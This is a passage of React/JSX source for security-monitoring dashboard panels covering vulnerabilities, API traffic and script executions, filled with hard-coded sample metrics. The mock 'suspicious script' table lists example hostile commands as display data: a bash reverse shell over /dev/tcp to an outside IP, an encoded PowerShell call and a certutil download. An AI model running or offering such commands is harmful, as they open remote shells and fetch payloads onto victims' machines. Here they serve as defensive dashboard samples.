    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /critical/i.test(String(cell)) ? MON.red : /high/i.test(String(cell)) ? MON.orange : /medium/i.test(String(cell)) ? MON.yellow : /low/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /critical|high|medium|low/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const kpis = [
    ['CRITICAL VULNERABILITIES', 128, '↑ 18 (vs last 7 days)', MON.red, '△'],
    ['HIGH VULNERABILITIES', 352, '↑ 28 (vs last 7 days)', MON.orange, '⬡'],
    ['MEDIUM VULNERABILITIES', 1248, '↓ 72 (vs last 7 days)', MON.yellow, '⬡'],
    ['LOW VULNERABILITIES', 2154, '↓ 179 (vs last 7 days)', MON.green, '⬡'],
    ['PATCH COMPLIANCE', '87%', '↑ 5% (vs last 7 days)', MON.blue, '◔'],
  ];
  return (
    <SocDashboardShell kind="patchvulnerability" active="Overview">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 9 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 84, border: `1px solid ${color}44`, borderRadius: 6, background: 'linear-gradient(135deg,rgba(11,29,51,.98),rgba(6,17,32,.98))', padding: 14, display: 'grid', gridTemplateColumns: '1fr 42px', alignItems: 'center' }}><span><b style={{ color, fontSize: 9 }}>{title}</b><strong style={{ display: 'block', color, fontSize: 27, lineHeight: 1.1 }}>{typeof value === 'number' ? value.toLocaleString() : value}</strong><small style={{ color: '#cbd5e1', fontSize: 8 }}>{sub}</small></span><span style={{ color, fontSize: 32 }}>{icon}</span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '.8fr 1fr 1.05fr', gap: 8 }}>
            <Panel title="Vulnerability Severity Distribution"><div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', padding: 14 }}><Donut value={56} label={String(vulnTotal)} color={MON.green} accent={MON.yellow} /><BarList rows={[{ label: 'Critical', value: 3, valueLabel: '128 (3.3%)', color: MON.red }, { label: 'High', value: 9, valueLabel: '352 (9.1%)', color: MON.orange }, { label: 'Medium', value: 32, valueLabel: '1,248 (32.1%)', color: MON.yellow }, { label: 'Low', value: 56, valueLabel: '2,154 (55.5%)', color: MON.green }]} /></div></Panel>
            <Panel title="Vulnerabilities Over Time (Last 30 Days)"><div style={{ height: 200, padding: 14, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px),linear-gradient(90deg,rgba(255,255,255,.05) 1px,transparent 1px)', backgroundSize: '55px 34px' }}>{monitorSpark([1800, 1900, 1980, 1850, 1930, 2050, 1990, 2140, 2260, 2130, 2080, 2180], MON.green, 'transparent', 130)}{monitorSpark([1050, 1120, 1090, 1190, 1140, 1280, 1220, 1320, 1260, 1350, 1290, 1300], MON.yellow, 'transparent', 130)}{monitorSpark([520, 610, 590, 660, 610, 720, 650, 700, 620, 690, 610, 640], MON.orange, 'transparent', 130)}{monitorSpark([110, 130, 120, 150, 140, 170, 160, 180, 150, 160, 130, 128], MON.red, 'transparent', 130)}</div></Panel>
            <Panel title="Top 10 Vulnerable Assets"><MiniRows rows={[['SRV-DB-01', '10.10.10.15', '15', '42', 'Critical'], ['WEB-SRV-02', '10.10.10.25', '12', '38', 'Critical'], ['APP-SRV-01', '10.10.10.20', '8', '27', 'High'], ['WIN-CLT-045', '10.10.20.45', '6', '19', 'High'], ['LIN-SRV-03', '10.10.10.30', '6', '16', 'Medium'], ['WIN-CLT-078', '10.10.20.78', '4', '14', 'Medium']]} /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr .8fr .9fr 1fr', gap: 8 }}>
            <Panel title="Patch Compliance Over Time (%)"><div style={{ height: 150, padding: 14, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px),linear-gradient(90deg,rgba(255,255,255,.05) 1px,transparent 1px)', backgroundSize: '48px 28px' }}>{monitorSpark([76, 80, 82, 81, 84, 83, 86, 85, 87, 86, 88, 87], MON.blue, 'transparent', 90)}</div></Panel>
            <Panel title="Missing Critical Patches"><div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', alignItems: 'center', padding: 12 }}><Donut value={52} label="245" color={MON.blue} accent={MON.green} /><BarList rows={[{ label: 'Windows', value: 52, valueLabel: '128 (52.2%)', color: MON.blue }, { label: 'Linux', value: 27, valueLabel: '67 (27.3%)', color: MON.green }, { label: 'Applications', value: 14, valueLabel: '35 (14.3%)', color: MON.orange }, { label: 'Network Devices', value: 6, valueLabel: '15 (6.1%)', color: MON.purple }]} /></div></Panel>
            <Panel title="Patch Deployment Status"><div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', alignItems: 'center', padding: 12 }}><Donut value={70} label="1,540" color={MON.green} accent={MON.yellow} /><BarList rows={[{ label: 'Installed', value: 70, valueLabel: '1,082 (70.3%)', color: MON.green }, { label: 'Pending', value: 17, valueLabel: '258 (16.8%)', color: MON.yellow }, { label: 'Failed', value: 6, valueLabel: '92 (6.0%)', color: MON.red }, { label: 'Not Applicable', value: 7, valueLabel: '108 (7.0%)', color: MON.muted }]} /></div></Panel>
            <Panel title="Vulnerabilities by Asset Type"><div style={{ padding: 12 }}><BarList rows={[{ label: 'Servers', value: 100, valueLabel: '1,256', color: MON.blue }, { label: 'Workstations', value: 88, valueLabel: '1,102', color: MON.green }, { label: 'Network Devices', value: 52, valueLabel: '652', color: MON.yellow }, { label: 'Applications', value: 40, valueLabel: '498', color: MON.orange }, { label: 'Cloud Resources', value: 30, valueLabel: '374', color: MON.purple }]} /></div></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.1fr .8fr .9fr', gap: 8 }}>
            <Panel title="Recent Alerts" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All Alerts →</span>}><MiniRows columns="110px 1fr 90px 70px 70px" rows={[['19 May 10:25 AM', 'Critical CVE Detected (CVE-2024-27956)', 'WEB-SRV-02', 'Critical', 'New'], ['19 May 09:47 AM', 'Patch Installation Failed', 'WIN-CLT-045', 'High', 'New'], ['19 May 08:15 AM', 'Asset Missing Critical Patch', 'SRV-DB-01', 'Critical', 'In Progress'], ['19 May 07:32 AM', 'Vulnerability Older Than 30 Days', 'APP-SRV-01', 'High', 'In Progress'], ['19 May 06:50 AM', 'Unsupported OS Detected', 'WIN-CLT-078', 'Medium', 'New']]} /></Panel>
            <Panel title="Vulnerability Aging"><div style={{ display: 'grid', gridTemplateColumns: '130px 1fr', alignItems: 'center', padding: 12 }}><Donut value={32} label={String(vulnTotal)} color={MON.yellow} accent={MON.green} /><BarList rows={[{ label: '0 - 30 Days', value: 32, valueLabel: '1,256', color: MON.green }, { label: '31 - 60 Days', value: 28, valueLabel: '1,102', color: MON.yellow }, { label: '61 - 90 Days', value: 17, valueLabel: '652', color: MON.orange }, { label: '90+ Days', value: 22, valueLabel: '872', color: MON.red }]} /></div></Panel>
            <Panel title="Remediation Progress"><div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', padding: 18 }}><div style={{ fontSize: 34, color: MON.green, fontWeight: 950, textAlign: 'center' }}>68%<small style={{ display: 'block', color: '#cbd5e1', fontSize: 10 }}>Completed</small></div><MiniRows columns="1fr 70px" rows={[['Total Vulnerabilities', '3,882'], ['Remediated', '2,636'], ['In Progress', '836'], ['Pending', '410']]} /></div></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5,1fr)', gap: 8, border: `1px solid ${MON.border}`, borderRadius: 6, background: '#071827', padding: 12 }}>
            {[['Total Assets', '1,245', MON.blue], ['Vulnerable Assets', '526', MON.red], ['Non-Compliant Assets', '312', MON.orange], ['Assets Offline', '24', MON.purple], ['Last Data Refresh', '19 May 2024 10:30 AM', MON.green]].map(([l, v, c]) => <div key={l} style={{ borderRight: `1px solid ${MON.line}`, padding: '0 12px' }}><span style={{ color: '#9db2ca', fontSize: 10 }}>{l}</span><b style={{ display: 'block', color: c, fontSize: 18 }}>{v}</b></div>)}
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading patch and vulnerability events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}


function LegacyApiCallMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const apiCalls = Math.max(Number(total || alerts.length || 0), 1250000);
  const fallbackSourceCountries = [
    { country: 'India', requests: 425600, pct: 34, x: 70, y: 53, color: MON.blue },
    { country: 'United States', requests: 245800, pct: 20, x: 22, y: 45, color: MON.blue },
    { country: 'Germany', requests: 125400, pct: 10, x: 52, y: 39, color: MON.cyan },
    { country: 'Singapore', requests: 98700, pct: 8, x: 76, y: 62, color: MON.green },
    { country: 'United Kingdom', requests: 78900, pct: 6, x: 47, y: 35, color: MON.cyan },
    { country: 'Others', requests: 279600, pct: 22, x: 38, y: 60, color: MON.muted },
  ];
  const countryPositions = {
    india: [70, 53], 'united states': [22, 45], germany: [52, 39], singapore: [76, 62],
    'united kingdom': [47, 35], china: [73, 45], russia: [64, 31], brazil: [35, 70],
    canada: [20, 32], australia: [82, 76], france: [50, 42], japan: [84, 47],
  };
  const countryCounts = alerts.reduce((acc, alert) => {
    const rawCountry = alert.geoCountry || alert.country || alert.rawEvent?.geoCountry || alert.rawEvent?.country || alert.rawEvent?.srcCountry || '';
    const country = String(rawCountry).trim();
    if (!country) return acc;
    acc[country] = (acc[country] || 0) + 1;
    return acc;
  }, {});
  const sourceCountries = Object.keys(countryCounts).length
    ? Object.entries(countryCounts)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 6)
      .map(([country, count], index) => {
        const totalCount = Object.values(countryCounts).reduce((sum, n) => sum + n, 0) || 1;
        const [x, y] = countryPositions[country.toLowerCase()] || [18 + index * 13, 40 + (index % 3) * 12];
        return { country, requests: count, pct: Math.round((count / totalCount) * 100), x, y, color: [MON.blue, MON.cyan, MON.green, MON.purple, MON.yellow, MON.muted][index] };
      })
    : fallbackSourceCountries;
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 11px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 80px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /auth failure|failed|high/i.test(String(cell)) ? MON.red : /sql|rate limit|medium/i.test(String(cell)) ? MON.orange : /success|low/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /high|medium|low|success/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const DynamicSourceIpMap = ({ countries }) => {
    const max = Math.max(...countries.map(c => c.requests), 1);
    return (
      <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0,1fr) 150px', gap: 10, padding: 12 }}>
        <div style={{ position: 'relative', minHeight: 150, border: `1px solid ${MON.line}`, borderRadius: 5, overflow: 'hidden', background: 'radial-gradient(circle at 52% 48%, rgba(20,133,255,.20), transparent 38%), linear-gradient(180deg,#071827,#06111f)' }}>
          <svg viewBox="0 0 1000 500" preserveAspectRatio="xMidYMid meet" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%' }}>
            <defs>
              <linearGradient id="apiMapLand" x1="0" x2="1" y1="0" y2="1">
                <stop offset="0" stopColor="#255f9b" stopOpacity=".96" />
                <stop offset="1" stopColor="#12325a" stopOpacity=".96" />
              </linearGradient>
              <filter id="apiMapGlow" x="-20%" y="-20%" width="140%" height="140%">
                <feDropShadow dx="0" dy="0" stdDeviation="3" floodColor="#1485ff" floodOpacity=".22" />
              </filter>
            </defs>
            {[120, 220, 320, 420, 520, 620, 720, 820].map(x => <path key={`lon-${x}`} d={`M${x} 50 V445`} stroke="rgba(96,165,250,.08)" strokeWidth="1" />)}
            {[115, 190, 265, 340, 415].map(y => <path key={`lat-${y}`} d={`M55 ${y} H945`} stroke="rgba(96,165,250,.08)" strokeWidth="1" />)}
            <g fill="url(#apiMapLand)" stroke="#4d8fd0" strokeOpacity=".18" strokeWidth="1" filter="url(#apiMapGlow)">
              <path d="M99 160 L126 120 L171 96 L221 92 L267 110 L291 148 L276 178 L302 205 L282 236 L238 232 L217 262 L181 257 L153 235 L123 240 L93 217 L72 185 Z" />
              <path d="M214 265 L252 278 L276 318 L270 365 L246 419 L218 448 L193 411 L179 359 L157 331 L171 294 Z" />
              <path d="M385 128 L430 101 L481 111 L512 143 L498 179 L452 177 L419 202 L382 192 L353 161 Z" />
              <path d="M477 193 L515 204 L536 247 L528 298 L501 343 L473 315 L461 260 Z" />
              <path d="M535 154 L591 112 L657 105 L723 129 L790 119 L858 154 L883 195 L837 222 L771 213 L729 242 L671 225 L616 237 L573 213 L524 211 Z" />
              <path d="M705 260 L746 285 L758 334 L734 374 L695 356 L678 306 Z" />
              <path d="M812 330 L855 316 L902 341 L920 382 L886 408 L840 393 L803 360 Z" />
              <path d="M427 350 L457 365 L471 405 L450 432 L420 414 L408 378 Z" />
              <path d="M267 86 L294 60 L326 67 L311 96 Z" />
            </g>
            <path d="M58 250 C200 170 336 187 477 220 C615 252 726 167 940 205" fill="none" stroke="rgba(96,165,250,.10)" strokeWidth="9" strokeLinecap="round" />
            <path d="M63 317 C221 276 365 296 500 296 C657 296 755 270 938 330" fill="none" stroke="rgba(96,165,250,.08)" strokeWidth="8" strokeLinecap="round" />
          </svg>
          {countries.map((c, index) => {
            const size = 8 + Math.round((c.requests / max) * 14);
            return (
              <span key={c.country} title={`${c.country}: ${shortNum(c.requests)} (${c.pct}%)`} style={{ position: 'absolute', left: `${c.x}%`, top: `${c.y}%`, width: size, height: size, marginLeft: -size / 2, marginTop: -size / 2, borderRadius: '50%', background: c.color, border: '2px solid rgba(219,234,254,.72)', boxShadow: `0 0 ${12 + size}px ${c.color}`, opacity: index === countries.length - 1 && c.country === 'Others' ? .55 : .95 }} />
            );
          })}
        </div>
        <MiniRows
          columns="1fr 82px"
          rows={countries.map(c => [c.country, `${shortNum(c.requests)} (${c.pct}%)`])}
        />
      </div>
    );
  };
  const kpis = [
    ['Total API Calls', '1.25M', '↑ 12.5%', MON.blue, '▤'],
    ['Successful Calls', '1.10M', '↑ 10.8%', MON.green, '✓'],
    ['Failed Calls', '153.5K', '↑ 18.3%', MON.red, '×'],
    ['Avg Response Time', '245 ms', '↑ 6.2%', MON.yellow, '◷'],
    ['Active Endpoints', 256, '↑ 8.6%', MON.purple, '⌘'],
  ];
  return (
    <SocDashboardShell kind="apicallmonitoring" active="Overview">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 9 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 84, border: `1px solid ${color}33`, borderRadius: 6, background: 'linear-gradient(135deg,rgba(11,29,51,.98),rgba(6,17,32,.98))', padding: 13, display: 'grid', gridTemplateColumns: '1fr 36px', alignItems: 'center' }}><span><b style={{ color, fontSize: 9 }}>{title}</b><strong style={{ display: 'block', color: '#f3f8ff', fontSize: 24 }}>{value}</strong><small style={{ color: '#cbd5e1', fontSize: 8 }}>{sub} · last 24 hours</small></span><span style={{ color, fontSize: 24 }}>{icon}</span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr .9fr', gap: 8 }}>
            <Panel title="API Traffic Over Time"><div style={{ height: 205, padding: 14, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px),linear-gradient(90deg,rgba(255,255,255,.05) 1px,transparent 1px)', backgroundSize: '52px 34px' }}>{monitorSpark([52, 61, 56, 68, 63, 82, 78, 91, 84, 72, 88, 79, 97, 113, 101], MON.blue, 'rgba(59,130,246,.14)', 135)}{monitorSpark([35, 43, 39, 51, 47, 61, 58, 69, 62, 54, 67, 59, 72, 82, 76], MON.green, 'transparent', 135)}{monitorSpark([4, 5, 4, 7, 6, 8, 7, 9, 7, 6, 10, 8, 12, 14, 11], MON.red, 'transparent', 135)}</div></Panel>
            <Panel title="Top API Endpoints"><MiniRows columns="1fr 52px 70px 72px 72px" rows={[['/api/v1/login', 'POST', '285.6K', '91.2%', '120 ms'], ['/api/v1/users', 'GET', '192.4K', '94.5%', '200 ms'], ['/api/v1/orders', 'POST', '158.7K', '89.1%', '310 ms'], ['/api/v1/products', 'GET', '125.6K', '96.7%', '180 ms'], ['/api/v1/payments', 'POST', '98.6K', '86.3%', '450 ms']]} /></Panel>
            <Panel title="Authentication Failures"><div style={{ display: 'grid', gridTemplateColumns: '125px 1fr', alignItems: 'center', padding: 12 }}><Donut value={34} label="6.7K" color={MON.purple} accent={MON.blue} /><BarList rows={[{ label: 'Invalid API Key', value: 34, valueLabel: '34.2%', color: MON.purple }, { label: 'Expired Token', value: 29, valueLabel: '28.7%', color: MON.blue }, { label: 'Invalid Token', value: 18, valueLabel: '18.4%', color: MON.orange }, { label: 'Auth Failures', value: 13, valueLabel: '12.6%', color: MON.red }, { label: 'Other', value: 6, valueLabel: '6.1%', color: MON.green }]} /></div></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr .9fr 1fr', gap: 8 }}>
            <Panel title="Threat Detection (Top Events)"><MiniRows columns="1fr 58px 80px 62px" rows={[['SQL Injection Attempts', '1.25K', 'spark', 'High'], ['XSS Attempts', '987', 'spark', 'High'], ['Path Traversal Attempts', '645', 'spark', 'Medium'], ['Brute Force Attempts', '532', 'spark', 'Medium'], ['SSRF Attempts', '321', 'spark', 'Low']]} /></Panel>
            <Panel title="Response Time Analytics"><div style={{ height: 155, padding: 14, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px),linear-gradient(90deg,rgba(255,255,255,.05) 1px,transparent 1px)', backgroundSize: '45px 30px' }}>{monitorSpark([95, 100, 110, 102, 120, 130, 125, 150, 170, 190, 230, 260, 310, 480, 420, 560], MON.blue, 'transparent', 95)}</div><MiniRows columns="1fr 1fr 1fr 1fr" rows={[['Min', '85 ms', 'Max', '620 ms'], ['95th Percentile', '480 ms', '99th Percentile', '560 ms']]} /></Panel>
            <Panel title="Source IP Analysis (Top Countries)"><DynamicSourceIpMap countries={sourceCountries} /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr .9fr 1fr', gap: 8 }}>
            <Panel title="Rate Limit Violations"><div style={{ display: 'grid', gridTemplateColumns: '130px 1fr', gap: 12, padding: 12 }}><div><strong style={{ color: '#f3f8ff', fontSize: 20 }}>3.2K</strong><small style={{ display: 'block', color: MON.green }}>↑ 16.7%</small>{monitorSpark([3, 8, 5, 12, 9, 14, 19, 13, 18, 24, 29, 33], MON.red, 'transparent', 65)}</div><MiniRows columns="1fr 58px" rows={[['192.168.1.105', '432'], ['203.0.113.45', '321'], ['185.220.101.23', '278'], ['198.51.100.77', '215']]} /></div></Panel>
            <Panel title="Payload Analysis"><div style={{ padding: 12, display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 8 }}>{[['Avg Request Size', '2.45 KB', MON.cyan], ['Avg Response Size', '12.6 KB', MON.green], ['Large Payloads', '1.2K', MON.yellow]].map(([l, v, c]) => <section key={l} style={{ border: `1px solid ${c}33`, borderRadius: 5, padding: 10, background: '#071827' }}><b style={{ color: c, fontSize: 9 }}>{l}</b><strong style={{ display: 'block', color: '#e5edf7', fontSize: 18 }}>{v}</strong>{monitorSpark([4, 6, 5, 8, 7, 9, 6, 10], c, 'transparent', 36)}</section>)}</div></Panel>
            <Panel title="Real-time API Events"><MiniRows columns="1fr 82px 72px" rows={[['Failed Login Attempt · POST /api/v1/login', 'Auth Failure', '10:30:45'], ['SQL Injection Attempt Detected · POST /api/v1/search', 'SQLi', '10:30:42'], ['Rate Limit Exceeded · GET /api/v1/products', 'Rate Limit', '10:30:40'], ['Successful API Call · GET /api/v1/users', 'Success', '10:30:38'], ['Invalid API Key · POST /api/v1/orders', 'Auth Failure', '10:30:35']]} /></Panel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading API call events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function ScriptExecutionMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const scriptTotal = Math.max(Number(total || alerts.length || 0), 12458);
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 11px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 80px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>
      {rows.map((row, index) => <div key={`${row.join('|')}-${index}`} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /critical|blocked|encoded|reverse/i.test(String(cell)) ? MON.red : /high|powershell|bash/i.test(String(cell)) ? MON.orange : /medium|allowed/i.test(String(cell)) ? MON.yellow : /low|python|node/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /critical|high|medium|low|blocked|allowed/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const kpis = [
    ['Total Scripts Executed', shortNum(scriptTotal), '↑ 18.6%', MON.blue, '⌘', [8, 13, 9, 17, 15, 24, 18, 28, 21, 33, 25, 31]],
    ['PowerShell Executions', '3,245', '↑ 15.3%', MON.green, '∑', [12, 15, 14, 22, 18, 26, 20, 29, 24, 31, 27, 35]],
    ['Bash Executions', '4,312', '↑ 12.7%', MON.yellow, '>_', [10, 12, 11, 18, 14, 20, 17, 24, 19, 27, 21, 25]],
    ['Python Executions', '1,987', '↑ 19.8%', MON.purple, 'Py', [7, 9, 8, 12, 10, 16, 13, 19, 15, 20, 16, 22]],
    ['Node.js Executions', '864', '↑ 11.2%', MON.cyan, 'JS', [4, 7, 5, 9, 8, 12, 9, 14, 11, 16, 12, 15]],
    ['Blocked Scripts', '237', '↑ 23.4%', MON.red, '×', [2, 3, 4, 5, 3, 7, 6, 9, 5, 11, 8, 13]],
  ];
  const scriptTypes = [
    { label: 'Bash', value: 4312, valueLabel: '4,312 (34.6%)', color: MON.green },
    { label: 'PowerShell', value: 3245, valueLabel: '3,245 (26.0%)', color: MON.blue },
    { label: 'Python', value: 1987, valueLabel: '1,987 (15.9%)', color: MON.purple },
    { label: 'Node.js', value: 864, valueLabel: '864 (6.9%)', color: MON.cyan },
    { label: 'Batch/CMD', value: 782, valueLabel: '782 (6.3%)', color: '#94a3b8' },
    { label: 'JavaScript', value: 645, valueLabel: '645 (5.2%)', color: MON.yellow },
    { label: 'Others', value: 623, valueLabel: '623 (5.1%)', color: MON.orange },
  ];
  return (
    <SocDashboardShell kind="scriptmonitoring" active="overview">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1180, display: 'grid', gap: 9 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon, data]) => <section key={title} style={{ minHeight: 84, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}22,rgba(6,17,32,.98) 58%)`, padding: 12, display: 'grid', gridTemplateColumns: '42px 1fr', gap: 10, alignItems: 'center' }}><span style={{ width: 34, height: 34, borderRadius: 7, display: 'grid', placeItems: 'center', color: '#fff', background: color, fontSize: 15, fontWeight: 950 }}>{icon}</span><span><b style={{ color: '#dbeafe', fontSize: 10 }}>{title}</b><strong style={{ display: 'block', color: '#f3f8ff', fontSize: 22, lineHeight: 1.05 }}>{value}</strong><small style={{ color: MON.green, fontSize: 8 }}>{sub} vs yesterday</small>{monitorSpark(data, color, 'transparent', 24)}</span></section>)}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.35fr .85fr .8fr', gap: 8 }}>
            <Panel title="Script Executions Over Time" right={<span style={{ color: MON.muted, fontSize: 9 }}>Last 24 Hours⌄</span>}>
              <div style={{ height: 210, padding: 14, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px),linear-gradient(90deg,rgba(255,255,255,.05) 1px,transparent 1px)', backgroundSize: '52px 34px' }}>
                {monitorSpark([740, 610, 680, 560, 720, 910, 1030, 820, 690, 860, 1110, 1220, 960, 1010, 900, 1160, 980, 1110, 1240, 1050, 890], MON.green, 'transparent', 145)}
                {monitorSpark([520, 480, 510, 590, 670, 810, 690, 620, 770, 910, 900, 760, 700, 740, 690, 830, 980, 790, 1010, 760, 560], MON.yellow, 'transparent', 145)}
                {monitorSpark([310, 260, 280, 240, 330, 390, 350, 420, 530, 460, 410, 360, 390, 440, 330, 390, 500, 420, 470, 360, 340], MON.purple, 'transparent', 145)}
                {monitorSpark([120, 90, 130, 100, 150, 170, 140, 160, 210, 190, 170, 130, 160, 180, 150, 170, 240, 180, 260, 150, 130], MON.blue, 'transparent', 145)}
              </div>
            </Panel>
            <Panel title="Script Type Distribution" right={<span style={{ color: MON.muted, fontSize: 9 }}>Last 24 Hours⌄</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', padding: 12 }}>
                <Donut value={35} label="12,458" color={MON.green} accent={MON.blue} />
                <BarList rows={scriptTypes} />
              </div>
            </Panel>
            <Panel title="Alert Summary" right={<span style={{ color: MON.muted, fontSize: 9 }}>Last 24 Hours⌄</span>}>
              <MiniRows columns="1fr 58px 60px" rows={[['Critical', '32', '↑ 28.0%'], ['High', '78', '↑ 15.6%'], ['Medium', '156', '↓ 10.2%'], ['Low', '342', '↓ 5.3%'], ['Total Alerts', '608', '↑ 12.4%']]} />
            </Panel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.35fr .7fr .7fr', gap: 8 }}>
            <Panel title="Top Suspicious Script Executions" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}>
              <MiniRows columns="82px 1.35fr 95px 96px 60px 65px 65px" rows={[
                ['Today, 14:32:18', 'powershell.exe -enc SQBFAFgA...', 'CORP\\j.smith', 'WIN-10-22-45', 'PS', 'Critical', 'Blocked'],
                ['Today, 14:21:09', 'bash -i >& /dev/tcp/45.77.2.15/4444 0>&1', 'root', 'WEB-SRV-02', 'Bash', 'Critical', 'Blocked'],
                ['Today, 14:15:44', 'python.exe c:\\temp\\scanner.py', 'CORP\\m.johnson', 'APP-SRV-07', 'Python', 'High', 'Allowed'],
                ['Today, 13:58:33', 'cmd.exe /c certutil -urlcache -f http://...', 'CORP\\a.kumar', 'WIN-10-33-18', 'CMD', 'High', 'Blocked'],
                ['Today, 13:42:11', 'node.exe c:\\users\\app\\update.js', 'CORP\\s.verma', 'APP-SRV-03', 'Node', 'Medium', 'Allowed'],
              ]} />
            </Panel>
            <Panel title="Top Hosts by Script Executions" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 66px 72px" rows={[['WIN-10-22-45', '1,248', 'spark'], ['WEB-SRV-02', '1,102', 'spark'], ['APP-SRV-07', '987', 'spark'], ['WIN-10-33-18', '876', 'spark'], ['DB-SRV-01', '765', 'spark']]} /></Panel>
            <Panel title="Top Users by Script Executions" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 66px 72px" rows={[['CORP\\j.smith', '1,987', 'spark'], ['CORP\\m.johnson', '1,654', 'spark'], ['root', '1,245', 'spark'], ['CORP\\a.kumar', '1,112', 'spark'], ['ubuntu', '987', 'spark']]} /></Panel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.95fr 1fr .75fr', gap: 8 }}>
            <Panel title="Threat Detections" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}>
